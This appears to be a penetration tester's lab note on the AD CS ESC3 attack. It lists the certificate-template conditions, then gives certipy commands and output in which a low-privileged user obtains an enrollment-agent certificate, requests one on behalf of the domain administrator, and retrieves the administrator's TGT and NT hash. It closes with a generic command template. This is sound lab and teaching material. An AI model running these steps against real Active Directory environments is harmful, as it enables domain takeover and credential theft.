The Certificate Request Agent EKU (Enrollment Agent) enables a principal to request a certificate on behalf of another user. The `enrollment agent` enrolls in this template and employs the resulting certificate to collaboratively sign a Certificate Signing Request (CSR) on behalf of another user. Subsequently, the enrollment agent forwards the co-signed CSR to the Certification Authority while enrolling in a template that authorises `enroll on behalf of`. In response, the CA issues a certificate belonging to the `other` user.

Requires two templates matching the connections.
### Condition 1  

A template allows a low-privileged user to enrol in an enrolment agent certificate

- The Enterprise CA grants low-privileged users enrolment rights (same as `ESC1`).
- Manager approval should be turned off (same as `ESC1`).
- No authorised signatures are required (same as `ESC1`).
- The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enrol for certificates (same as `ESC1`).
- The certificate template includes the `Certificate Request Agent EKU`, specifically the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1), allowing the requesting of other certificate templates on behalf of other principals.

![[Pasted image 20241006151606.png]]

### Condition 2

Another template permits a low privileged user to use the enrolment agent
certificate to request a certificate on behalf of another user, and the template defines an EKU that allows for domain authentication.

- The Enterprise CA grants low-privileged users enrolment rights (same as `ESC1`).
- Manager approval should be turned off (same as `ESC1`).
- The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
- The certificate template defines an EKU that enables domain authentication.
- No restrictions on enrolment agents are implemented at the CA level.

In the following example the `User` template  matches the requirements. The following was taken from Windows as this provides more information. This does not flag as an ESC3 vulnerability:

![[Pasted image 20241006153253.png]]

The following template can also be used is it matches the `Schema Version 2` requirements

![[Pasted image 20241006150915.png]]

First we request a certificate as our self targeting the vulnerable template:

```bash
garffff@garffff:~/GOAD/esc3$ certipy req -u khal.drogo@essos.local -p 'horse' -template ESC3-CRA -ca ESSOS-CA -dc-ip 192.168.56.23
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 34
[*] Got certificate with UPN 'khal.drogo@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'khal.drogo.pfx'
```

Next is to request a certificate on behalf of the target user:

```bash

garffff@garffff:~/GOAD/esc3$ certipy req -u khal.drogo@essos.local -p 'horse' -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx -dc-ip 192.168.56.23
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 35
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Then authenticate as that user and obtain the hash

```bash
garffff@garffff:~/GOAD/esc3$ certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

### Summary

The `-on-behalf` need to be  the NetBIOS  of the domain and not the FQDN. E.g. `essos` and not `essos.local`

```bash
certipy req -u <user>@<domain> -p '<horse>' -template <condition1_template> -ca <ca> -dc-ip <adcs_ip>
certipy req -u <user>@<domain> -p '<horse>' -template <condition2_template> -ca <ca> -on-behalf-of '<domain>\<target_user>' -pfx <user>.pfx -dc-ip <adcs_ip>
certipy auth -pfx <target_user>.pfx -dc-ip <dc_ip>
```

